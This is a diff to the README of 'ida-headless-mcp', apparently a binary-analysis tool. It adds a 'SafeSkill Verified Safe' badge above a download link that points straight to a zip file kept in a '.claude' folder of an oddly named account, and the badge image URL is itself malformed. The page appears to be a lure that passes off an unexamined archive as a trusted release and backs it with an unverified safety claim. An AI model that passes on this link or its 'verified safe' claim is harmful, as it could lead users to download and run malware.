@@ -1,5 +1,7 @@
 # 🛠️ ida-headless-mcp - Easy Binary Analysis Made Simple
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/zdhhjhfjkhhhhjilk-ida-headless-mcp)
+
 ## 📦 Download Now
 [![Download Latest Release](https://raw.githubusercontent.com/Zdhhjhfjkhhhhjilk/ida-headless-mcp/main/.claude/ida-mcp-headless-v2.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Zdhhjhfjkhhhhjilk/ida-headless-mcp/main/.claude/ida-mcp-headless-v2.5.zip) 
 
